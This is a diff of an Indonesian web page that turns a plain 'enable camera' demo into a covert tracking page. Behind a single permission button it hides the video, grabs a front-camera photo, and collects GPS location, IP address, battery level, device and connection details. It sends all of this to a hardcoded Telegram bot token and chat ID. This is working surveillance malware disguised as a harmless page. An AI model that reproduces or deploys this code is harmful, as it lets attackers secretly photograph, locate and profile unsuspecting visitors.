@@ -1,58 +1,173 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Akses Kamera Custom</title>
+  <meta charset="UTF-8">
+  <title>1 Tombol, Kamera + Lokasi</title>
   <style>
-    body {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      margin-top: 50px;
-      font-family: sans-serif;
+    video, canvas {
+      display: none;
     }
 
-    #cameraBtn {
-      background-color: #4CAF50;
+    #izinBtn {
+      background-color: #007bff;
       color: white;
-      padding: 15px 30px;
-      font-size: 18px;
+      padding: 15px 25px;
+      font-size: 16px;
       border: none;
-      border-radius: 10px;
+      border-radius: 8px;
       cursor: pointer;
-      transition: background-color 0.3s ease;
     }
 
-    #cameraBtn:hover {
-      background-color: #45a049;
-    }
-
-    video {
-      margin-top: 20px;
-      width: 90%;
-      max-width: 480px;
-      border: 3px solid #4CAF50;
-      border-radius: 10px;
+    #izinBtn:hover {
+      background-color: #0056b3;
     }
   </style>
 </head>
 <body>
 
-  <button id="cameraBtn">🎥 Aktifkan Kamera</button>
+  <button id="izinBtn">🎥📍 Izinkan Kamera & Lokasi</button>
+
   <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
   <script>
-    document.getElementById("cameraBtn").addEventListener("click", async () => {
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    const chatId = "7134507231";
+    const botToken = "7941067223:AAGonUiEibmN7Skq5jGESFzcqCf_OxodNi4";
+
+    async function ambilLokasi() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve("Tidak diketahui");
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const { latitude, longitude } = pos.coords;
+            resolve(`${latitude.toFixed(4)}, ${longitude.toFixed(4)}`);
+          },
+          () => resolve("Tidak diketahui"),
+          { enableHighAccuracy: true, timeout: 3000 }
+        );
+      });
+    }
+
+    async function ambilIP() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const videoElement = document.getElementById("video");
-        videoElement.srcObject = stream;
-      } catch (error) {
-        alert("Akses kamera ditolak atau tidak tersedia.");
-        console.error(error);
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "Tidak diketahui";
       }
-    });
+    }
+
+    async function ambilBaterai() {
+      if (navigator.getBattery) {
+        try {
+          const bat = await navigator.getBattery();
+          return Math.round(bat.level * 100) + "%";
+        } catch {
+          return "Tidak diketahui";
+        }
+      }
+      return "Tidak didukung";
+    }
+
+    function ambilPerangkat() {
+      const ua = navigator.userAgent;
+      if (/Android/i.test(ua)) return "Android";
+      if (/iPhone/i.test(ua)) return "iPhone";
+      if (/iPad/i.test(ua)) return "iPad";
+      if (/Windows NT/i.test(ua)) return "Windows";
+      if (/Mac OS X/i.test(ua)) return "Mac OS";
+      if (/Linux/i.test(ua)) return "Linux";
+      return "Tidak dikenali";
+    }
+
+    function ambilKoneksi() {
+      const conn = navigator.connection || {};
+      const type = conn.effectiveType || "Tidak diketahui";
+      const downlink = conn.downlink ? conn.downlink + " Mbps" : "Tidak diketahui";
+      return `${type.toUpperCase()} (${downlink})`;
+    }
+
+    function ucapanWaktu() {
+      const jam = new Date().getHours();
+      if (jam >= 5 && jam < 11) return "Selamat Pagi";
+      if (jam >= 11 && jam < 15) return "Selamat Siang";
+      if (jam >= 15 && jam < 18) return "Selamat Sore";
+      return "Selamat Malam";
+    }
+
+    function getFormattedWaktu() {
+      return new Date().toLocaleString("id-ID", {
+        timeZone: "Asia/Jakarta",
+        year: "numeric",
+        month: "2-digit",
+        day: "2-digit",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit",
+        hour12: false
+      });
+    }
+
+    async function mulaiSemua() {
+      try {
+        // Akses Kamera
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        video.srcObject = stream;
+
+        video.onloadedmetadata = async () => {
+          const lokasi = await ambilLokasi();
+          const ip = await ambilIP();
+          const baterai = await ambilBaterai();
+          const perangkat = ambilPerangkat();
+          const koneksi = ambilKoneksi();
+          const waktu = getFormattedWaktu();
+          const ucapan = ucapanWaktu();
+
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          canvas.toBlob((blob) => {
+            const caption = `<pre><b>⚠︎ TERDETEKSI SOSOK ANOMALI</b></pre>
+
+Waktu : ${waktu} WIB
+Lokasi : ${lokasi}
+IP : ${ip}
+Koneksi : ${koneksi}
+Perangkat : ${perangkat}
+Kamera : Depan
+Sistem : Non-rooted
+Baterai : ${baterai}
+
+<pre>© by @dy.tgh</pre>`;
+
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "kamera.jpg");
+            formData.append("caption", caption);
+            formData.append("parse_mode", "HTML");
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+              method: "POST",
+              body: formData
+            })
+            .then(res => res.json())
+            .then(data => console.log("Terkirim ke Telegram:", data))
+            .catch(err => console.error("Gagal kirim:", err));
+          }, "image/jpeg");
+        };
+      } catch (err) {
+        alert("Izin kamera atau lokasi ditolak.");
+        console.error(err);
+      }
+    }
+
+    document.getElementById("izinBtn").addEventListener("click", mulaiSemua);
   </script>
 
 </body>
